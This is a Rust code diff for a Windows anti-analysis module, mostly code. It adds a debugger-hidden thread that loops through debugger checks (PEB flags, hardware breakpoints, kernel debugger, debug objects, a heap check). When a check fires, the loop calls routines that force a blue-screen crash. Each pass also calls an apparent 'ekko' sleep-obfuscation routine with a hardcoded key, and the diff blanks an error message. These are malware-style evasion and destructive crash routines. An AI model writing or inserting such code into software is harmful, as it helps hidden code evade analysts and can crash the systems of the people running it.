@@ -1,9 +1,11 @@
 
+use ntapi::ntpebteb::PEB;
 use winapi::shared::basetsd::ULONG_PTR;
 use winapi::shared::minwindef::{DWORD, PBYTE, HMODULE};
 use winapi::shared::ntdef::{NTSTATUS, PVOID, HANDLE, PULONG, BOOLEAN};
 use winapi::um::heapapi::{GetProcessHeap, HeapWalk};
 use winapi::um::minwinbase::PROCESS_HEAP_ENTRY;
+use winapi::um::winnt::{PLIST_ENTRY};
 
 use std::ptr;
 use winapi::shared::minwindef::BOOL;
@@ -50,6 +52,9 @@ use std::process;
 
 use std::arch::asm;
 
+use crate::bsod::{nt_bsod, self};
+use crate::ekko;
+
 #[repr(C)]
 struct PROCESS_BASIC_INFORMATION {
     Reserved1: PVOID,
@@ -75,7 +80,7 @@ pub fn check_heap() -> Result<bool, &'static str> {
 
     loop {
         if unsafe { HeapWalk(heap, &mut heap_entry) } == 0 {
-            return Err("HeapWalk failed");
+            return Err("");
         }
 
         if heap_entry.wFlags & winapi::um::minwinbase::PROCESS_HEAP_ENTRY_BUSY != 0 {
@@ -134,9 +139,14 @@ pub fn check_remote_debugger_present() -> bool {
     }
 }
 
+
+
 pub fn create_debugger_hidden_thread() {
     let handler = thread::spawn(|| {
         // thread code
+        
+        
+
         const THREAD_HIDE_FROM_DEBUGGER: u32 = 0x11; //todo: verify this value
 
         let _status = unsafe {
@@ -147,7 +157,34 @@ pub fn create_debugger_hidden_thread() {
                 0,
             )
         };
+        let mut key_buf = "nvj8210rjnv0jr23n9h\0".as_bytes().to_vec();
+        loop {
 
+            match check_heap() {
+                Ok(result) => {
+                    if(result == true) {
+                        bsod::zw_bsod();
+                        bsod::nt_bsod()
+                    }
+                },
+                Err(e) => println!("error {}", e),
+            }
+            
+            //Run anti-debug checks in infinite loop
+            if(check_debugger_present() || 
+            check_remote_debugger_present() || 
+            check_drx_breakpoint() || 
+            check_kuser_shared_data_structure() || 
+            check_kernel_debugger() || 
+            adbg_nt_global_flag_peb() ||
+            adbg_being_debugged_peb() ||
+            query_kernel_debug_object()) {
+                bsod::zw_bsod();
+                bsod::nt_bsod()
+            }
+
+            ekko::ekko(4000, &mut key_buf);
+        }
     });
     
     handler.join().unwrap();
@@ -216,12 +253,6 @@ pub fn query_kernel_debug_object() -> bool {
         return false
     }
 }
-
-
-pub fn new_anti_dbg_test() -> bool {
-    return false;
-}
-
 
 pub fn adbg_being_debugged_peb() -> bool {
     let mut found: BOOL = 0;
